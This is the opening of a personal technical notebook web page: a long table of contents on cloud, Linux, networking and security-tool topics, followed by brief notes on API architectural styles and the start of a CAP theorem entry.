<!DOCTYPE HTML>
<html lang="en" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>notebook</title>
        <meta name="robots" content="noindex">


        <!-- Custom HTML head -->
        <link rel="icon" href="theme/logo.png">
        

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon-de23e50b.svg">
        <link rel="shortcut icon" href="favicon-8114d1fc.png">
        <link rel="stylesheet" href="css/variables-8adf115d.css">
        <link rel="stylesheet" href="css/general-2459343d.css">
        <link rel="stylesheet" href="css/chrome-9dfbd86b.css">
        <link rel="stylesheet" href="css/print-9e4910d8.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="fonts/fonts-9644e21d.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="mdbook-highlight-css" href="highlight-493f70e1.css">
        <link rel="stylesheet" id="mdbook-tomorrow-night-css" href="tomorrow-night-4c0ae647.css">
        <link rel="stylesheet" id="mdbook-ayu-highlight-css" href="ayu-highlight-3fdfc3ac.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="theme/custom-e80eafda.css">


        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "";
            const default_light_theme = "light";
            const default_dark_theme = "navy";
            window.path_to_searchindex_js = "searchindex-4d96fbd6.js";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="toc-36c9dcb5.js"></script>
    </head>
    <body>
    <div id="mdbook-help-container">
        <div id="mdbook-help-popup">
            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
            <div>
                <p>Press <kbd>‚Üê</kbd> or <kbd>‚Üí</kbd> to navigate between chapters</p>
                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
                <p>Press <kbd>?</kbd> to show this help</p>
                <p>Press <kbd>Esc</kbd> to hide this help</p>
            </div>
        </div>
    </div>
    <div id="mdbook-body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="mdbook-sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("mdbook-sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
                sidebar_toggle.checked = false;
            }
            if (sidebar === 'visible') {
                sidebar_toggle.checked = true;
            } else {
                html.classList.remove('sidebar-visible');
            }
        </script>

        <nav id="mdbook-sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
            </noscript>
            <div id="mdbook-sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="mdbook-page-wrapper" class="page-wrapper">

            <div class="page">
                <a href="https://rnemeth90.github.io" class="back-to-blog">
                    üè† Back to Blog
                </a>
                
                <div id="mdbook-menu-bar-hover-placeholder"></div>
                <div id="mdbook-menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="mdbook-sidebar-toggle" class="icon-button" for="mdbook-sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="mdbook-sidebar">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M0 96C0 78.3 14.3 64 32 64H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32H416c17.7 0 32 14.3 32 32z"/></svg></span>
                        </label>
                        <button id="mdbook-theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="mdbook-theme-list">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M371.3 367.1c27.3-3.9 51.9-19.4 67.2-42.9L600.2 74.1c12.6-19.5 9.4-45.3-7.6-61.2S549.7-4.4 531.1 9.6L294.4 187.2c-24 18-38.2 46.1-38.4 76.1L371.3 367.1zm-19.6 25.4l-116-104.4C175.9 290.3 128 339.6 128 400c0 3.9 .2 7.8 .6 11.6c1.8 17.5-10.2 36.4-27.8 36.4H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H240c61.9 0 112-50.1 112-112c0-2.5-.1-5-.2-7.5z"/></svg></span>
                        </button>
                        <ul id="mdbook-theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-ayu">Ayu</button></li>
                        </ul>
                        <button id="mdbook-search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="mdbook-searchbar">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352c79.5 0 144-64.5 144-144s-64.5-144-144-144S64 128.5 64 208s64.5 144 144 144z"/></svg></span>
                        </button>
                    </div>

                    <h1 class="menu-title">notebook</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <span class=fa-svg id="print-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M128 0C92.7 0 64 28.7 64 64v96h64V64H354.7L384 93.3V160h64V93.3c0-17-6.7-33.3-18.7-45.3L400 18.7C388 6.7 371.7 0 354.7 0H128zM384 352v32 64H128V384 368 352H384zm64 32h32c17.7 0 32-14.3 32-32V256c0-35.3-28.7-64-64-64H64c-35.3 0-64 28.7-64 64v96c0 17.7 14.3 32 32 32H64v64c0 35.3 28.7 64 64 64H384c35.3 0 64-28.7 64-64V384zm-16-88c-13.3 0-24-10.7-24-24s10.7-24 24-24s24 10.7 24 24s-10.7 24-24 24z"/></svg></span>
                        </a>

                    </div>
                </div>

                <div id="mdbook-search-wrapper" class="hidden">
                    <form id="mdbook-searchbar-outer" class="searchbar-outer">
                        <div class="search-wrapper">
                            <input type="search" id="mdbook-searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="mdbook-searchresults-outer" aria-describedby="searchresults-header">
                            <div class="spinner-wrapper">
                                <span class=fa-svg id="fa-spin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M304 48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zm0 416c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM48 304c26.5 0 48-21.5 48-48s-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48zm464-48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM142.9 437c18.7-18.7 18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zm0-294.2c18.7-18.7 18.7-49.1 0-67.9S93.7 56.2 75 75s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zM369.1 437c18.7 18.7 49.1 18.7 67.9 0s18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9z"/></svg></span>
                            </div>
                        </div>
                    </form>
                    <div id="mdbook-searchresults-outer" class="searchresults-outer hidden">
                        <div id="mdbook-searchresults-header" class="searchresults-header"></div>
                        <ul id="mdbook-searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('mdbook-sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('mdbook-sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#mdbook-sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="mdbook-content" class="content">
                    <main>
                        <h1 id="summary"><a class="header" href="#summary">Summary</a></h1>
<p>These are my notes, there are many like them, but these ones are mine.</p>
<ul>
<li><a href="#summary">Summary</a></li>
<li><a href="cheatsheets/README.html">Cheatsheets</a>
<ul>
<li><a href="#api-architectural-styles">API Architectural Styles</a></li>
<li><a href="#cap-theorem">cap theorem</a></li>
<li><a href="#standard-http-headers">standard http headers</a></li>
<li><a href="#latency-numbers-every-sre-should-know">Latency Numbers Every SRE Should Know</a></li>
<li><a href="#make-files">Make Files</a></li>
<li><a href="#neovim-cheatsheet">Neovim</a></li>
<li><a href="#nmap-cheatsheet">nmap</a></li>
<li><a href="#medusa-cheatsheet">medusa</a></li>
<li><a href="#hydra-cheatsheet">hydra</a></li>
<li><a href="#ranger-cheatsheet">Ranger</a></li>
<li><a href="#regex-cheatsheet">Regex</a></li>
<li><a href="#sql-cheat-sheet">SQL</a></li>
<li><a href="#multi-line-strings">yaml</a></li>
<li><a href="#ffuf-cheatsheet">ffuf</a></li>
<li><a href="#hashcat">hashcat</a></li>
</ul>
</li>
<li><a href="clouds/README.html">Clouds</a>
<ul>
<li><a href="clouds/aws/README.html">AWS</a>
<ul>
<li><a href="clouds/aws/dva-c02/README.html">DVA-C02-notes</a>
<ul>
<li><a href="#elastic-beanstalk">Elastic Beanstalk</a></li>
<li><a href="#cloudformation">CloudFormation</a></li>
<li><a href="#cloudfront">CloudFront</a></li>
<li><a href="#copilot">Copilot</a></li>
<li><a href="#elastic-container-registry">Elastic Container Registry</a></li>
<li><a href="#elastic-container-service">Elastic Container Service</a></li>
<li><a href="#dynamodb">Dynamodb</a></li>
<li><a href="#ec2">EC2</a></li>
<li><a href="#elasticache">Elasticache</a></li>
<li><a href="#iam">IAM</a></li>
<li><a href="#kinesis">Kinesis</a></li>
<li><a href="#lambda">Lambda</a></li>
<li><a href="#cloudtrail">CloudTrail</a></li>
<li><a href="#cloudwatch">CloudWatch</a></li>
<li><a href="#x-ray">x-ray</a></li>
<li><a href="#aurora">Aurora</a></li>
<li><a href="#rds-relational-database-service">RDS (Relational Database Service)</a></li>
<li><a href="#route53">Route53</a></li>
<li><a href="#s3">S3</a></li>
<li><a href="#simple-notification-system">Simple Notification System</a></li>
<li><a href="#simple-queue-system">Simple Queue System</a></li>
<li><a href="#vpc">VPC</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/README.html">AWS-Solutions-Architect-Associate-notes</a>
<ul>
<li><a href="#aws-certified-solutions-architect-associate-practice-exams">AWS Certified Solutions Architect Associate Practice Exams</a></li>
<li><a href="#table-of-contents-10">Table of Contents</a></li>
<li><a href="#study-more">Study-more</a></li>
<li><a href="#tutorialsdojo-cheatsheets">Tutorialsdojo Cheatsheets</a>
<ul>
<li><a href="#api-gateway-cheatsheet">Api-gateway-cheatsheet</a></li>
<li><a href="#queueing-sqs-1">Queueing (SQS)</a></li>
<li><a href="#cloudfront-cheatsheet">Cloudfront-cheatsheet</a></li>
<li><a href="#cloudfront-3">CloudFront</a></li>
<li><a href="#what-is-database--1">What is Database ?</a></li>
<li><a href="#disaster-recovery">Disaster Recovery</a></li>
<li><a href="#disaster-recovery-cheatsheet">Disaster-recovery-cheatsheet</a></li>
<li><a href="#savings-plan-1">Savings Plan</a></li>
<li><a href="#ec2-3">EC2</a></li>
<li><a href="#elastic-load-balancer-1">Elastic Load Balancer</a></li>
<li><a href="#elastic-file-system-efs-1">Elastic File System (EFS)</a></li>
<li><a href="#what-is-elasticache-for-redis-1">What is ElastiCache for Redis?</a></li>
<li><a href="#glue-cheatsheet">Glue-cheatsheet</a></li>
<li><a href="#aws-lambda-1">AWS Lambda</a></li>
<li><a href="#ml-models">Ml-models</a></li>
<li><a href="#what-is-amazon-quicksight--1">What is Amazon QuickSight ?</a></li>
<li><a href="#aurora-cheatsheet-1">Aurora Cheatsheet</a></li>
<li><a href="#rds-2">RDS</a></li>
<li><a href="#amazon-redshift-1">Amazon Redshift</a></li>
<li><a href="#dns-3">DNS</a></li>
<li><a href="#iam-1">IAM</a></li>
<li><a href="#aws-certificate-manager">AWS Certificate Manager</a></li>
<li><a href="#storage-cheatsheet">Storage-cheatsheet</a></li>
<li><a href="#introduction-to-s3-1">Introduction to S3</a></li>
<li><a href="#vpc-endpoint-cheatsheet">Vpc-endpoint-cheatsheet</a></li>
<li><a href="#vpc-flow-logs-cheatsheet">Vpc-flow-logs-cheatsheet</a></li>
<li><a href="#introduction-to-vpc-1">Introduction to VPC</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="clouds/azure/README.html">Azure</a>
<ul>
<li><a href="clouds/azure/az700/readme.html">Core Networking Infrastructure Checklist</a>
<ul>
<li><a href="clouds/azure/az700/design-and-implement-core-network-infra/README.html">Design-and-implement-core-network-infra</a>
<ul>
<li><a href="#ipv4-and-ipv6-addressing">IPv4 and IPv6 Addressing</a></li>
<li><a href="#azure-dns">Azure DNS</a></li>
<li><a href="#azure-virtual-network-nat">Azure Virtual Network NAT</a></li>
<li><a href="#subnets">Subnets</a></li>
<li><a href="#virtual-machine-scale-sets">Virtual Machine Scale Sets</a></li>
<li><a href="#azure-virtual-network-vnet">Azure Virtual Network (VNet)</a></li>
</ul>
</li>
<li><a href="clouds/azure/az700/design-and-implement-private-access/README.html">Design-and-implement-private-access</a>
<ul>
<li><a href="#private-link">Private Link</a></li>
<li><a href="#azure-service-endpoint">Azure Service Endpoint</a></li>
</ul>
</li>
<li><a href="clouds/azure/az700/design-and-implement-routing/README.html">Design-and-implement-routing</a>
<ul>
<li><a href="#application-gateway">Application Gateway</a></li>
<li><a href="#azure-availability-sets">Azure Availability Sets</a></li>
<li><a href="#azure-front-door">Azure Front Door</a></li>
<li><a href="#azure-load-balancer">Azure Load Balancer</a></li>
<li><a href="#azure-virtual-network-routing">Azure Virtual Network Routing</a></li>
<li><a href="#traffic-manager">Traffic Manager</a></li>
</ul>
</li>
<li><a href="clouds/azure/az700/design-implement-and-manage-hybrid-networking/README.html">Design-implement-and-manage-hybrid-networking</a>
<ul>
<li><a href="#azure-express-route">Azure Express Route</a></li>
<li><a href="#vpn">VPN</a></li>
<li><a href="#azure-virtual-wan">Azure Virtual WAN</a></li>
</ul>
</li>
<li><a href="clouds/azure/az700/secure-and-monitor-networks/README.html">Secure-and-monitor-networks</a>
<ul>
<li><a href="#application-security-groups">Application Security Groups</a></li>
<li><a href="#azure-firewall">Azure Firewall</a></li>
<li><a href="#ddos-protection">DDoS Protection</a></li>
<li><a href="#network-watcher">Network Watcher</a></li>
<li><a href="#network-security-groups">Network Security Groups</a></li>
<li><a href="#web-application-firewall">Web Application Firewall</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#assembly">Assembly</a></li>
<li><a href="#the-4-steps-of-compilation-with-gcc">The 4 Steps of Compilation with GCC</a></li>
<li><a href="#c-programming-notes">C Programming Notes</a></li>
<li><a href="#the-bufio-package">the bufio package</a></li>
<li><a href="#go-projects">Go-projects</a></li>
<li><a href="#immutability-1">Immutability</a></li>
<li><a href="#imperative-programming">Imperative-programming</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="compsci/README.html">Computer Science</a>
<ul>
<li><a href="#measuring-algorithm-performance">Algorithms</a></li>
<li><a href="#computer-architecture">Computer Architecture</a></li>
<li><a href="#data-structures">Data Structures</a></li>
<li><a href="#euclids-algorithm">Euclid‚Äôs Algorithm</a></li>
<li><a href="#fizzbuzz">fizzbuzz</a></li>
<li><a href="#graph-theory">Graph Theory</a></li>
<li><a href="#hashing">Hashing</a></li>
<li><a href="#string-algorithms">string algorithms</a></li>
</ul>
</li>
<li><a href="devops/README.html">DevOps</a>
<ul>
<li><a href="#devops-principles">DevOps Principles</a></li>
</ul>
</li>
<li><a href="kubernetes/README.html">Kubernetes</a>
<ul>
<li><a href="kubernetes/cks/README.html">CKS</a>
<ul>
<li><a href="#certified-kubernetes-security-specialist-cks-notes">Certified Kubernetes Security Specialist (CKS) Notes</a></li>
<li><a href="#kubernetes-security-specialist-cks-practice-scenarios">Kubernetes Security Specialist (CKS) Practice Scenarios</a></li>
</ul>
</li>
<li><a href="kubernetes/kcna/README.html">KCNA</a>
<ul>
<li><a href="#kubernetes-certified-native-associate-kcna-notes">Kubernetes Certified Native Associate (KCNA) Notes</a></li>
</ul>
</li>
<li><a href="kubernetes/kcsa/README.html">KCSA</a>
<ul>
<li><a href="#kubernetes-certified-security-associate-kcsa-notes">Kubernetes Certified Security Associate (KCSA) Notes</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="networking/README.html">Networking</a>
<ul>
<li><a href="networking/browser-networking/README.html">Browser Networking</a>
<ul>
<li><a href="#chapter-1">Chapter 1</a></li>
<li><a href="#chapter-2">Chapter 2</a></li>
<li><a href="#chapter-3">Chapter 3</a></li>
<li><a href="#chapter-4">Chapter 4</a></li>
<li><a href="#chapter09">Chapter09</a></li>
<li><a href="#chapter-10">Chapter 10</a></li>
<li><a href="#chapter-11">Chapter 11</a></li>
<li><a href="#chapter12">Chapter12</a></li>
<li><a href="#chapter-13">Chapter 13</a></li>
<li><a href="#chapter-15">Chapter 15</a></li>
<li><a href="#chapter-16">Chapter 16</a></li>
<li><a href="#chapter-17">Chapter 17</a></li>
</ul>
</li>
<li><a href="networking/http/README.html">HTTP</a>
<ul>
<li><a href="#clean-urls">Clean URLs</a></li>
<li><a href="#http-persistent-connection">HTTP Persistent Connection</a></li>
<li><a href="#urn">URN</a></li>
</ul>
</li>
<li><a href="networking/load-balancing/README.html">Load Balancing</a>
<ul>
<li><a href="#load-balancing-1">load balancing</a></li>
</ul>
</li>
<li><a href="networking/nginx/README.html">Nginx</a>
<ul>
<li><a href="#set-header">set header</a></li>
</ul>
</li>
<li><a href="networking/rate-limiting/README.html">Rate Limiting Algorithms</a>
<ul>
<li><a href="#fixed-window-counter-algorithm">Fixed Window Counter Algorithm</a></li>
<li><a href="#leaking-bucket-algorithm">Leaking Bucket Algorithm</a></li>
<li><a href="#token-bucket-algorithm">TOKEN BUCKET ALGORITHM</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="networking/protocols/README.html">Protocols</a>
<ul>
<li><a href="#dns-2">DNS</a></li>
<li><a href="#ftp">FTP</a></li>
<li><a href="#icmp">ICMP</a></li>
<li><a href="#imap--pop3">IMAP/POP3</a></li>
<li><a href="#mqtt">MQTT</a></li>
<li><a href="#nfs-network-file-system">NFS</a></li>
<li><a href="#ntp">NTP</a></li>
<li><a href="#quic">QUIC</a></li>
<li><a href="#server-message-block-smb">SMB</a></li>
<li><a href="#smtp-simple-mail-transfer-protocol">SMTP</a></li>
<li><a href="#snmp">SNMP</a></li>
<li><a href="#ssh">SSH</a></li>
<li><a href="#tls">TLS</a></li>
<li><a href="#udp-1">UDP</a></li>
<li><a href="#websockets">WebSockets</a></li>
</ul>
</li>
<li><a href="redis/README.html">Redis</a>
<ul>
<li><a href="#redis-2">redis</a></li>
</ul>
</li>
<li><a href="systems/README.html">Systems</a>
<ul>
<li><a href="#linux-kernel-boot-process">Linux Kernel Boot Process</a></li>
<li><a href="#common-files-and-directories">Common Files and Directories</a></li>
<li><a href="#dev-tools">Dev Tools</a></li>
<li><a href="#devices">devices</a></li>
<li><a href="#disks">Disks</a></li>
<li><a href="#file-systems">file systems</a></li>
<li><a href="#groups-1">Groups</a></li>
<li><a href="#hashing-1">Hashing</a></li>
<li><a href="#interrupts-and-traps">Interrupts and Traps</a></li>
<li><a href="#kernel-subsystems">kernel subsystems</a></li>
<li><a href="#key-value-store">Key Value Store</a></li>
<li><a href="#hard-and-soft-links">Hard and Soft Links</a></li>
<li><a href="#commands-2">commands</a></li>
<li><a href="#logging">Logging</a></li>
<li><a href="#lvm-logical-volume-manager">lvm (logical volume manager)</a></li>
<li><a href="#make">make</a></li>
<li><a href="#memory">memory</a></li>
<li><a href="#memory-management">Memory Management</a></li>
<li><a href="#network-manager">network manager</a></li>
<li><a href="#networking-1">Networking</a></li>
<li><a href="#linux-observability-sources">Linux Observability Sources</a></li>
<li><a href="#pluggable-authentication-modules-pam">Pluggable Authentication Modules (PAM)</a></li>
<li><a href="#per-process-analysis">Per-Process Analysis</a></li>
<li><a href="#permissions">Permissions</a></li>
<li><a href="#processes">processes</a></li>
<li><a href="#scheduled-tasks">Scheduled Tasks</a></li>
<li><a href="#bash-startup-files">Bash Startup Files</a></li>
<li><a href="#troubleshooting-storage">Troubleshooting Storage</a></li>
<li><a href="#system-calls">System Calls</a></li>
<li><a href="#system-wide-analysis">System Wide Analysis</a></li>
<li><a href="#systemd">Systemd</a></li>
<li><a href="#the-first-60-seconds">The first 60 seconds</a></li>
<li><a href="#time">time</a></li>
<li><a href="#troubleshooting">troubleshooting</a></li>
<li><a href="#users-and-user-management">Users and User Management</a></li>
<li><a href="systems/bash/README.html">Bash</a>
<ul>
<li><a href="#bash-notes">bash notes</a></li>
<li><a href="#moving-the-cursor-1">Moving the cursor:</a></li>
</ul>
</li>
<li><a href="systems/commands/README.html">Commands</a>
<ul>
<li><a href="#chgrp">chgrp</a></li>
<li><a href="#chmod">Chmod</a></li>
<li><a href="#chown">chown</a></li>
<li><a href="#dd">dd</a></li>
<li><a href="#groups-2">groups</a></li>
<li><a href="#ip">ip</a></li>
<li><a href="#job-control">Job Control</a></li>
<li><a href="#kill">Kill</a></li>
<li><a href="#lsscsi">lsscsi</a></li>
<li><a href="#passwd">passwd</a></li>
<li><a href="#ps">ps</a></li>
<li><a href="#umask">umask</a></li>
</ul>
</li>
<li><a href="systems/greybeard-qualification/README.html">Greybeard Qualification</a>
<ul>
<li><a href="#block-devices-and-file-systems">Block Devices and File Systems</a></li>
<li><a href="#memory-management-1">Memory Management</a></li>
<li><a href="#execution-and-scheduling-of-processes-and-threads">Execution and Scheduling of Processes and Threads</a></li>
<li><a href="#process-structure-and-ipc">Process Structure and IPC</a></li>
<li><a href="#startup-and-init">Startup and Init</a></li>
</ul>
</li>
<li><a href="systems/linux-kernel-development/README.html">Linux Kernel Development</a>
<ul>
<li><a href="#building-the-linux-kernel">Building the Linux Kernel</a></li>
<li><a href="#kernel-modules">Kernel Modules</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="tools/README.html">Tools</a>
<ul>
<li><a href="#need-to-addrefine">Need to add/refine:</a></li>
<li><a href="#instructions-for-using-dnspinger">instructions for using dnspinger</a></li>
<li><a href="#nmap-1">nmap</a></li>
<li><a href="#medusa">medusa</a></li>
<li><a href="#hydra">hydra</a></li>
</ul>
</li>
<li><a href="troubleshooting/README.html">Troubleshooting</a>
<ul>
<li><a href="#performance-mantras">Performance Mantras</a></li>
<li><a href="#the-problem-statement">The Problem Statement</a></li>
<li><a href="#red-method">RED Method</a></li>
<li><a href="#use-method">USE Method</a></li>
<li><a href="troubleshooting/linux/README.html">Linux</a>
<ul>
<li><a href="#troubleshooting-memory">Troubleshooting Memory</a></li>
</ul>
</li>
<li><a href="troubleshooting/troubleshooting_playbook/README.html">Troubleshooting Playbook</a>
<ul>
<li><a href="#troubleshooting-503s-for-apps-in-kubernetes">Troubleshooting 503s for Apps in Kubernetes</a></li>
<li><a href="#general-troubleshootingnotes">General troubleshooting/notes</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="what-happens-when/README.html">What Happens When‚Ä¶</a>
<ul>
<li><a href="#what-happens-when-a-cpu-starts">What happens when a CPU starts?</a></li>
</ul>
</li>
<li><a href="fun/README.html">Fun</a>
<ul>
<li><a href="#modifying-machine-code-in-executables">Modify Machine Code</a></li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cheatsheets"><a class="header" href="#cheatsheets">Cheatsheets</a></h1>
<h2 id="directory-map"><a class="header" href="#directory-map">Directory Map</a></h2>
<ul>
<li><a href="#api-architectural-styles">api_architecture_styles</a></li>
<li><a href="#cap-theorem">cap_theorem</a></li>
<li><a href="#standard-http-headers">http_headers</a></li>
<li><a href="#latency-numbers-every-sre-should-know">latency_numbers</a></li>
<li><a href="#make-files">make_files</a></li>
<li><a href="#medusa-cheatsheet">medusa</a></li>
<li><a href="#neovim-cheatsheet">neovim</a></li>
<li><a href="#nmap-cheatsheet">nmap</a></li>
<li><a href="#ranger-cheatsheet">ranger</a></li>
<li><a href="#regex-cheatsheet">regex</a></li>
<li><a href="#sql-cheat-sheet">sql</a></li>
<li><a href="#multi-line-strings">yaml</a></li>
<li><a href="#hydra-cheatsheet">hydra</a></li>
<li><a href="#ffuf-cheatsheet">ffuf</a></li>
<li><a href="#hashcat">hashcat</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="api-architectural-styles"><a class="header" href="#api-architectural-styles">API Architectural Styles</a></h1>
<h2 id="rest"><a class="header" href="#rest">REST</a></h2>
<p>Proposed in 2000, REST is the most used style. It is often used between front-end clients and back-end services. It is compliant with 6 architectural constraints. The payload format can be JSON, XML, HTML, or plain text.</p>
<h2 id="graphql"><a class="header" href="#graphql">GraphQL</a></h2>
<p>GraphQL was proposed in 2015 by Meta. It provides a schema and type system, suitable for complex systems where the relationships between entities are graph-like. For example, in the diagram below, GraphQL can retrieve user and order information in one call, while in REST this needs multiple calls.</p>
<p>GraphQL is not a replacement for REST. It can be built upon existing REST services.</p>
<h2 id="web-socket"><a class="header" href="#web-socket">Web Socket</a></h2>
<p>Web socket is a protocol that provides full-duplex communications over TCP. The clients establish web sockets to receive real-time updates from the back-end services. Unlike REST, which always ‚Äúpulls‚Äù data, web socket enables data to be ‚Äúpushed‚Äù.</p>
<h2 id="webhook"><a class="header" href="#webhook">Webhook</a></h2>
<p>Webhooks are usually used by third-party asynchronous API calls. In the diagram below, for example, we use Stripe or Paypal for payment channels and register a webhook for payment results. When a third-party payment service is done, it notifies the payment service if the payment is successful or failed. Webhook calls are usually part of the system‚Äôs state machine.</p>
<h2 id="grpc"><a class="header" href="#grpc">gRPC</a></h2>
<p>Released in 2016, gRPC is used for communications among microservices. gRPC library handles encoding/decoding and data transmission.</p>
<h2 id="soap"><a class="header" href="#soap">SOAP</a></h2>
<p>SOAP stands for Simple Object Access Protocol. Its payload is XML only, suitable for communications between internal systems.</p>
<p><img src="cheatsheets/images/api_arch_styles/styles.png" alt=""></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cap-theorem"><a class="header" href="#cap-theorem">cap theorem</a></h1>
<p>CAP theorem states that it is impossible for a distributed system to provide more than two of these guarantees: consistency, availability, and partition tolerance.</p>
<ul>
<li>Consistency
<ul>
<li>All clients see the same data at the same time from any node
<img src="cheatsheets/images/cap_theorem/consistency.png" alt=""></li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>
<p>Availability</p>
<ul>
<li>The ability for a system to respond to requests from users at all times</li>
</ul>
<p><img src="cheatsheets/images/cap_theorem/availability.png" alt=""></p>
</li>
</ul>
<hr>
